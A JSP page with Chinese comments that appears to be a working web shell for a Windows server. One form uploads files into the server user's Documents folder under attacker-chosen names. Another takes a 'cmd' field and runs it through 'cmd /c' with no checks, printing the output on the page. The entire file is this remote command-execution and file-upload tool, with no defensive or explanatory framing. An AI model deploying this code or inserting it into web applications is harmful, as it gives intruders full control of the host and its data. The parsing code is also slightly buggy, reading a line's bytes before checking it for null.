<%@page import="java.io.PrintWriter"%>
<%@page import="java.io.InputStreamReader"%>
<%@page import="java.io.DataOutputStream"%>
<%@page import="java.io.StringReader"%>
<%@page import="java.io.BufferedReader"%>
<%@page import="java.io.DataInputStream"%>
<%@page import="java.io.InputStream"%>
<%@page import="java.io.BufferedWriter"%>
<%@page import="java.io.OutputStreamWriter"%>
<%@page import="java.io.FileOutputStream"%>
<%@page import="java.io.File"%>
<%@page import="java.io.IOException"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
  
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Insert title here</title>
</head>
<body>
<form    enctype="multipart/form-data" method="post">
	<input type="file" name="file1" value ="请选择文件" size="999"> <br/>
 	<input type="submit" value="提交">
</form>


<form  enctype="multipart/form-data" method="post">
    <input type="text" name="cmd" value="help"><br/>	 
 	<input type="submit" value="提交">
</form>


<% 
System.out.println();
if(request.getContentLengthLong()!=-1){
load(request,response);
}

%>
 <%!

	protected static void load(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {

		// 1.判断当前request消息实体的总长度
		int totalBytes = request.getContentLength();
		System.out.println("当前数据总长度:" + totalBytes);
		// 2.在消息头类型中找出分解符,例如:boundary=----WebKitFormBoundaryeEYAk4vG4tRKAlB6
		String contentType = request.getContentType();
		int position = contentType.indexOf("boundary=");
		String startBoundary = "--" + contentType.substring(position + "boundary=".length());
		
		String endBoundary = startBoundary + "--";
		// 将request的输入流读入到bytes中
		InputStream inputStream = request.getInputStream();
		DataInputStream dataInputStream = new DataInputStream(inputStream);
		byte[] bytes = new byte[totalBytes];
		dataInputStream.readFully(bytes);
		dataInputStream.close();
		// 将字节读入到字符流中
		 System.out.println("=============================");
		System.out.println(new String(bytes));
		System.out.println("=============================");
		BufferedReader reader = new BufferedReader(new StringReader(new String(bytes)));
		int temPosition = 0;
		boolean flag = false;
		int end = 0;
		while (true) {
			// 当读取一次文件信息后
			if (flag) {
				bytes = subBytes(bytes, end, totalBytes);
				temPosition = 0;
				reader = new BufferedReader(new StringReader(new String(bytes)));
			}
			// 读取一行的信息:------WebKitFormBoundary5R7esAd459uwQsd5,即:lastBoundary
			String str = reader.readLine();
			System.out.println("this line is:" + str);
			// 换行算两个字符
			temPosition += str.getBytes().length + 2;
			// endBoundary:结束
			if (str == null || str.equals(endBoundary)) {
				break;
			}
			// 表示头信息的开始(一个标签,input,select等)
			if (str.startsWith(startBoundary)) {
				// 判断当前头对应的表单域类型
				str = reader.readLine(); // 读取当前头信息的下一行:Content-Disposition行
				temPosition += str.getBytes().length + 2;
	            System.out.println(str);
				int position1 = str.indexOf("filename="); // 判断是否是文件上传
				if (position1 == -1) {// 表示是普通文本域上传
					reader.readLine();
					  cmd=reader.readLine();
					  %>
					  <textarea rows="30" cols="72"><%= command(cmd) %></textarea>
						<%!  			 
				} else {// position1!=-1,表示是文件上传
						// 解析当前上传的文件对应的name(input标签的name),以及fieldname:文件名
					int position2 = str.indexOf("name=");
					String name = str.substring(position2 + "name=".length() + 1, position1 - 3);
					String filename = str.substring(position1 + "filename=".length() + +1, str.length() - 1);
					if(filename.length()>1){
					filename=new String (filename.getBytes(),"utf-8");
					// 读取行,such as:Content-Type: image/jpeg,记录字节数,此处两次换行
					temPosition += (reader.readLine().getBytes().length + 4);
					end =  locateEnd(bytes, temPosition, totalBytes, endBoundary);
					//String path = request.getSession().getServletContext().getRealPath("/");
					String SavePath = System.getProperty("user.home") + "\\Documents\\";
						DataOutputStream dOutputStream = new DataOutputStream(
								new FileOutputStream(new File(SavePath + filename)));
						dOutputStream.write(bytes, temPosition, end - temPosition - 2);
						dOutputStream.close();
						response.getWriter().println(filename+"上传成功！");
					}else{
						break;
					}
				 
					flag = true;
				}
			}
		}
	}
 
	public static int locateEnd(byte[] bytes, int start, int end, String endStr) {
		byte[] endByte = endStr.getBytes();
		
		for (int i = start + 1; i < end; i++) {
			if (bytes[i] == endByte[0]) {
				int k = 1;
				while (k < endByte.length) {
					if (bytes[i + k] != endByte[k]) {
						break;
					}
					k++;
				}
				//System.out.println(i);
				if (i == 3440488) {
					System.out.println("start");
				}
				// 返回结束符的开始位置
				if (k == endByte.length) {
					return i;
				}
			}
		}

		return 0;
	}
	 static String cmd="";
	 	static String command(String x){
		 String Res="";
		 try{
			 x = x == null ? "ver" : x;
			 Process p = Runtime.getRuntime().exec("cmd /c " + x);
			 InputStream is = p.getInputStream();
			 InputStream rr = p.getErrorStream();
			 BufferedReader reader = new BufferedReader(new InputStreamReader(is, "GBK"));
			 BufferedReader readrr = new BufferedReader(new InputStreamReader(rr, "GBK"));
			 String line;
			 while ((line = reader.readLine()) != null || (line = readrr.readLine()) != null) {
			 	 Res+=line+"\r\n";
			 }
			 reader.close();
			 p.destroy();
		 }catch(Exception e){
			 
		 }
		 return Res;
	 }
	private static byte[] subBytes(byte[] b, int from, int end) {
		byte[] result = new byte[end - from];
		System.arraycopy(b, from, result, 0, end - from);
		return result;
	}
 %>
</body>
</html>